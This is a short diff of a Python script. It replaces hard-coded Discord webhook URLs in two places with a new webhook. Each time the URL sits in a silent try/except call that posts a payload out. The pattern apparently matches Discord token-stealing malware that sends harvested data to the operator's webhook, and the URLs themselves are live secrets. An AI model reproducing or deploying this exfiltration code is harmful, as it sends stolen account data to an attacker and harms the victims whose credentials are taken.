@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discordapp.com/api/webhooks/822492887936794685/l-PXon3A25M3cmRBbVyS4_h4MUplG5BuAWVaw6TkOLNf6nGH5G-XZ6oAoD1fsvj5MJ_n", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("https://discord.com/api/webhooks/1449233517933367410/h4uDv3fkZPWuFITCj6s7BSUd6uk6-vy8CBXuxYkcPejtumpCkkijEzUOIFm5ipoJZ46s", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
@@ -370,7 +370,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/1449111593769238579/8D_ZEonuolGAE6wa2JcKtsYCXEyUQf9e0Y_iOTTJ_3Lf2wV4hl66UpBdUpoH8vUoQobV", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("https://discord.com/api/webhooks/1449233517933367410/h4uDv3fkZPWuFITCj6s7BSUd6uk6-vy8CBXuxYkcPejtumpCkkijEzUOIFm5ipoJZ46s", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
